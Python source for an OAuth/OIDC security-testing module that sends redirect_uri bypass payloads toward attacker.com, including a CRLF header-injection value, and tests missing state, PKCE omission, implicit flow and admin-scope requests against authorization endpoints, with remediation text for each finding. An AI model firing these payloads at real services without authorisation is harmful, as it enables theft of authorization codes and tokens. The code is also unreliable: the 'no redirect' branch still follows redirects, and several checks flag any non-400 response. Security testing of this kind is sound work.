"""
WardenStrike - OAuth 2.0 / SAML / SSO Security Tester
Tests: open redirect in redirect_uri, CSRF via state, token leakage,
PKCE bypass, implicit flow issues, SAML misconfigs, SSO bypass.
"""

import hashlib
import json
import re
import secrets
import urllib.parse
import urllib.request
import urllib.error
from dataclasses import dataclass, field

from wardenstrike.config import Config
from wardenstrike.utils.logger import get_logger

log = get_logger("oauth_tester")


@dataclass
class OAuthFinding:
    issue: str
    severity: str
    attack_type: str
    details: dict = field(default_factory=dict)
    poc: str = ""
    remediation: str = ""


class OAuthTester:
    """
    OAuth 2.0, OIDC, and SAML security testing suite.
    Covers common bug bounty OAuth vulnerabilities.
    """

    def __init__(self, config: Config, ai=None):
        self.config = config
        self.ai = ai
        self.findings: list[OAuthFinding] = []

    def _add(self, issue, severity, attack_type, details=None, poc="", remediation=""):
        f = OAuthFinding(issue, severity, attack_type, details or {}, poc, remediation)
        self.findings.append(f)
        log.info(f"[OAuth/{severity.upper()}] {issue}")

    def _get(self, url: str, headers: dict = None, allow_redirects: bool = True,
             timeout: int = 10) -> tuple[str, int, dict]:
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "WardenStrike/1.0",
                                                         **(headers or {})})
            # Disable redirect following to detect redirect_uri leaks
            if not allow_redirects:
                opener = urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
                opener.addheaders = []
                with opener.open(req, timeout=timeout) as resp:
                    return resp.read().decode(errors="replace"), resp.status, dict(resp.headers)
            else:
                with urllib.request.urlopen(req, timeout=timeout) as resp:
                    return resp.read().decode(errors="replace"), resp.status, dict(resp.headers)
        except urllib.error.HTTPError as e:
            try:
                return e.read().decode(errors="replace"), e.code, dict(e.headers)
            except Exception:
                return "", e.code, {}
        except Exception:
            return "", -1, {}

    # ─── OAuth Discovery ──────────────────────────────────────────

    def discover_oauth(self, target: str) -> dict:
        """Discover OAuth endpoints via well-known discovery."""
        discovery = {}
        discovery_paths = [
            "/.well-known/openid-configuration",
            "/.well-known/oauth-authorization-server",
            "/oauth/.well-known/openid-configuration",
            "/auth/.well-known/openid-configuration",
        ]

        for path in discovery_paths:
            url = target.rstrip("/") + path
            body, status, _ = self._get(url)
            if status == 200:
                try:
                    data = json.loads(body)
                    discovery = data
                    log.info(f"OAuth discovery found at: {url}")
                    break
                except Exception:
                    pass

        return discovery

    # ─── Open Redirect in redirect_uri ────────────────────────────

    def test_redirect_uri_bypass(self, auth_endpoint: str, client_id: str,
                                  legit_redirect: str) -> list[dict]:
        """
        Test redirect_uri validation weaknesses.
        Common bypasses: subdomain, path traversal, URL fragments, case changes.
        """
        log.info("Testing redirect_uri bypass...")
        results = []

        # Parse legitimate redirect URI
        parsed = urllib.parse.urlparse(legit_redirect)
        domain = parsed.netloc
        path = parsed.path

        bypass_uris = [
            # Subdomain bypass
            f"https://attacker.com@{domain}{path}",
            f"https://{domain}.attacker.com{path}",
            f"https://attacker.com",
            # Path traversal
            f"https://{domain}{path}/../evil",
            f"https://{domain}{path}%2f%2fattacker.com",
            # Fragment
            f"https://attacker.com#{legit_redirect}",
            f"https://{domain}{path}#@attacker.com",
            # Query param injection
            f"https://{domain}{path}?redirect=https://attacker.com",
            # Protocol swap
            f"http://{domain}{path}",  # downgrade to HTTP
            # Wildcard if allowed
            f"https://{domain}/",
            f"https://{domain}",
            # URL encoding
            f"https://{domain}{path}%0d%0aLocation:%20https://attacker.com",
        ]

        for bypass_uri in bypass_uris:
            params = {
                "client_id": client_id,
                "redirect_uri": bypass_uri,
                "response_type": "code",
                "scope": "openid profile email",
                "state": secrets.token_urlsafe(16),
            }
            test_url = f"{auth_endpoint}?{urllib.parse.urlencode(params)}"
            body, status, headers = self._get(test_url, allow_redirects=False)

            location = headers.get("Location", headers.get("location", ""))
            if location and "attacker.com" in location:
                self._add("OAuth redirect_uri bypass — token/code leak to attacker domain",
                          "critical", "open_redirect",
                          details={"bypass_uri": bypass_uri, "location": location},
                          poc=f"GET {test_url}",
                          remediation="Implement exact-match redirect_uri validation. Reject partial matches.")
                results.append({"bypass": bypass_uri, "location": location})
            elif status in (302, 301) and bypass_uri in (location or ""):
                self._add(f"redirect_uri not properly validated: {bypass_uri}",
                          "high", "open_redirect",
                          details={"bypass_uri": bypass_uri},
                          poc=f"GET {test_url}",
                          remediation="Use exact-match validation for redirect_uri")
                results.append({"bypass": bypass_uri})

        return results

    # ─── State Parameter CSRF ─────────────────────────────────────

    def test_state_csrf(self, auth_endpoint: str, client_id: str,
                         redirect_uri: str) -> bool:
        """Test if state parameter is validated (CSRF protection)."""
        log.info("Testing OAuth state parameter CSRF...")

        # First: test without state
        params_no_state = {
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "response_type": "code",
            "scope": "openid profile",
        }
        url_no_state = f"{auth_endpoint}?{urllib.parse.urlencode(params_no_state)}"
        _, status_no_state, headers_no_state = self._get(url_no_state, allow_redirects=False)

        # If server accepts request without state
        if status_no_state not in (400, 422):
            self._add("OAuth state parameter not enforced — CSRF attack possible",
                      "high", "csrf_state",
                      details={"test_url": url_no_state, "status": status_no_state},
                      poc=f"1. Craft OAuth URL without state\n2. Trick victim to visit it\n3. Code bound to attacker session",
                      remediation="Enforce state parameter. Validate it on callback. Use PKCE for public clients.")
            return True

        return False

    # ─── Token Leakage in Referrer ────────────────────────────────

    def test_token_in_url(self, app_url: str) -> bool:
        """Check if access tokens appear in URLs (logs/referrer leakage)."""
        body, status, _ = self._get(app_url)

        token_patterns = [
            r"access_token=([^&\s\"']+)",
            r"id_token=([^&\s\"']+)",
            r"token=([^&\s\"']+)",
            r"Bearer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+)",
        ]

        for pattern in token_patterns:
            matches = re.findall(pattern, body)
            if matches:
                self._add("OAuth token exposed in URL/page source",
                          "high", "token_leakage",
                          details={"pattern": pattern, "sample": matches[0][:50]},
                          remediation="Use fragment (#) for implicit flow tokens. Prefer authorization code + PKCE.")
                return True

        return False

    # ─── PKCE bypass ──────────────────────────────────────────────

    def test_pkce_bypass(self, token_endpoint: str, auth_code: str,
                          redirect_uri: str, client_id: str) -> bool:
        """
        Test if PKCE code_verifier is properly validated.
        Try exchanging code without code_verifier.
        """
        log.info("Testing PKCE bypass...")

        params = {
            "grant_type": "authorization_code",
            "code": auth_code,
            "redirect_uri": redirect_uri,
            "client_id": client_id,
            # Intentionally omitting code_verifier
        }

        try:
            data = urllib.parse.urlencode(params).encode()
            req = urllib.request.Request(token_endpoint, data=data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "WardenStrike/1.0",
            }, method="POST")
            with urllib.request.urlopen(req, timeout=10) as resp:
                body = json.loads(resp.read())
                if "access_token" in body:
                    self._add("PKCE code_verifier not enforced — auth code interception possible",
                              "high", "pkce_bypass",
                              details={"token_endpoint": token_endpoint},
                              poc="Exchange auth code without code_verifier → receive access token",
                              remediation="Enforce PKCE code_verifier on the token endpoint")
                    return True
        except Exception:
            pass

        return False

    # ─── Implicit Flow ────────────────────────────────────────────

    def check_implicit_flow(self, auth_endpoint: str, client_id: str,
                              redirect_uri: str) -> bool:
        """Check if server supports implicit flow (deprecated, insecure)."""
        params = {
            "client_id": client_id,
            "redirect_uri": redirect_uri,
            "response_type": "token",  # implicit flow
            "scope": "openid profile",
            "state": secrets.token_urlsafe(16),
        }

        _, status, headers = self._get(
            f"{auth_endpoint}?{urllib.parse.urlencode(params)}",
            allow_redirects=False
        )

        location = headers.get("Location", "")
        if "access_token=" in location or (status not in (400, 422, 403)):
            self._add("OAuth implicit flow supported — token exposed in URL fragment",
                      "medium", "implicit_flow",
                      details={"response_type": "token"},
                      remediation="Deprecate implicit flow. Use authorization code + PKCE instead.")
            return True

        return False

    # ─── Token Scope Escalation ───────────────────────────────────

    def test_scope_escalation(self, auth_endpoint: str, client_id: str,
                               redirect_uri: str) -> list[str]:
        """Test if additional scopes can be requested without authorization."""
        sensitive_scopes = [
            "admin", "write:admin", "read:admin", "offline_access",
            "https://www.googleapis.com/auth/admin.directory.user",
            "https://graph.microsoft.com/.default",
            "https://management.azure.com/user_impersonation",
        ]

        granted = []
        for scope in sensitive_scopes:
            params = {
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "response_type": "code",
                "scope": scope,
                "state": secrets.token_urlsafe(16),
            }
            body, status, headers = self._get(
                f"{auth_endpoint}?{urllib.parse.urlencode(params)}",
                allow_redirects=False
            )
            # If redirect doesn't include error=invalid_scope
            location = headers.get("Location", "")
            if "error" not in location and status not in (400, 422):
                granted.append(scope)
                self._add(f"Elevated scope may be grantable: {scope}",
                          "medium", "scope_escalation",
                          details={"scope": scope},
                          remediation="Validate requested scopes against client registration. Reject unauthorized scopes.")

        return granted

    # ─── Full OAuth Test ──────────────────────────────────────────

    async def test(self, target: str, client_id: str = "",
                   redirect_uri: str = "", auth_endpoint: str = "",
                   token_endpoint: str = "") -> dict:
        """Run complete OAuth/OIDC security assessment."""
        log.info(f"Starting OAuth assessment: {target}")
        self.findings.clear()

        # Discovery
        discovery = self.discover_oauth(target)
        if discovery:
            auth_endpoint = auth_endpoint or discovery.get("authorization_endpoint", "")
            token_endpoint = token_endpoint or discovery.get("token_endpoint", "")

        results = {
            "target": target,
            "discovery": discovery,
            "auth_endpoint": auth_endpoint,
        }

        if auth_endpoint and client_id:
            if redirect_uri:
                results["redirect_uri_bypasses"] = self.test_redirect_uri_bypass(
                    auth_endpoint, client_id, redirect_uri)
            results["csrf_state"] = self.test_state_csrf(auth_endpoint, client_id, redirect_uri or "https://example.com")
            results["implicit_flow"] = self.check_implicit_flow(auth_endpoint, client_id, redirect_uri or "https://example.com")
            results["scope_escalation"] = self.test_scope_escalation(auth_endpoint, client_id, redirect_uri or "https://example.com")

        results["token_in_url"] = self.test_token_in_url(target)
        results["findings"] = [vars(f) for f in self.findings]
        results["summary"] = {
            "total": len(self.findings),
            "critical": sum(1 for f in self.findings if f.severity == "critical"),
            "high": sum(1 for f in self.findings if f.severity == "high"),
        }

        return results
